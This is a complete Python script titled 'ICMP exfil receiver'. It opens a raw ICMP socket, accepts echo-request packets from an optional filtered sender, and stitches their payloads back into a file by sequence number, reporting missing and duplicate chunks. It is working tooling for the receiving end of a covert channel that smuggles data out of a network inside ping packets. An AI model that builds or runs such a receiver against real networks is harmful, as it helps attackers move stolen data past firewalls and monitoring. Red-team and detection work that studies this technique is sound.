#!/usr/bin/env python3

import socket
import struct
import signal
import sys
import argparse

ECHO_REQUEST = 8


def parse_args():
    p = argparse.ArgumentParser(description="ICMP exfil receiver")
    p.add_argument("-o", "--output", default="exfil.bin")
    p.add_argument("-s", "--source", default=None, help="Filter by sender IP")
    p.add_argument("-t", "--timeout", type=float, default=5.0, help="Inactivity timeout (s)")
    p.add_argument("--keep-nulls", action="store_true", help="Keep trailing null bytes")
    return p.parse_args()


def find_gaps(chunks):
    if not chunks:
        return []

    expected = set(range(min(chunks), max(chunks) + 1))
    missing = sorted(expected - set(chunks))

    if not missing:
        return []

    ranges, start, end = [], missing[0], missing[0]
    for m in missing[1:]:
        if m == end + 1:
            end = m
        else:
            ranges.append((start, end))
            start = end = m
    ranges.append((start, end))
    return ranges


def show_gaps(chunks):
    if not chunks:
        return

    gaps = find_gaps(chunks)
    if not gaps:
        print(f"  [OK] No gaps in range {min(chunks)}..{max(chunks)}")
        return

    lost = sum(e - s + 1 for s, e in gaps)
    labels = [str(s) if s == e else f"{s}-{e}" for s, e in gaps]
    print(f"  [!] {lost} missing: {', '.join(labels)}")


def reassemble(chunks, path, strip):
    if not chunks:
        print("[!] Nothing received")
        return

    blob = b"".join(chunks[seq] for seq in sorted(chunks))

    if strip:
        blob = blob.rstrip(b"\x00")

    with open(path, "wb") as f:
        f.write(blob)

    print(f"\n[+] Written {path} ({len(chunks)} chunks, {len(blob)} bytes)")


def main():
    args = parse_args()
    strip = not args.keep_nulls

    chunks = {}
    rounds = 0
    new = 0
    dupes = 0
    active = False

    def on_sigint(sig, frame):
        print("\n")
        show_gaps(chunks)
        reassemble(chunks, args.output, strip)
        sys.exit(0)

    signal.signal(signal.SIGINT, on_sigint)

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2 * 1024 * 1024)
    sock.settimeout(args.timeout)

    print(f"[*] Listening for ICMP Echo Requests")
    if args.source:
        print(f"[*] Source filter: {args.source}")
    print(f"[*] Timeout: {args.timeout}s")
    print(f"[*] Ctrl+C to reassemble\n")

    while True:
        try:
            packet, addr = sock.recvfrom(65535)
        except socket.timeout:
            if active:
                active = False
                print(f"\n  --- Round {rounds} done: +{new} new, {dupes} dupes, {len(chunks)} total ---")
                show_gaps(chunks)
                print(f"\n[*] Waiting for next round...\n")
            continue

        if args.source and addr[0] != args.source:
            continue

        ip_header_len = (packet[0] & 0x0F) * 4
        icmp = packet[ip_header_len:]

        if len(icmp) < 8 or icmp[0] != ECHO_REQUEST or icmp[1] != 0:
            continue

        seq = struct.unpack("!H", icmp[6:8])[0]
        payload = icmp[8:]

        if not active:
            active = True
            rounds += 1
            new = 0
            dupes = 0
            print(f"  === Round {rounds} from {addr[0]} ===")

        is_new = seq not in chunks
        chunks[seq] = payload
        new += is_new
        dupes += not is_new

        tag = "+" if is_new else "="
        print(f"  {tag} seq={seq:>5d}  {len(payload):>4d}B  new={new}  total={len(chunks)}")


if __name__ == "__main__":
    main()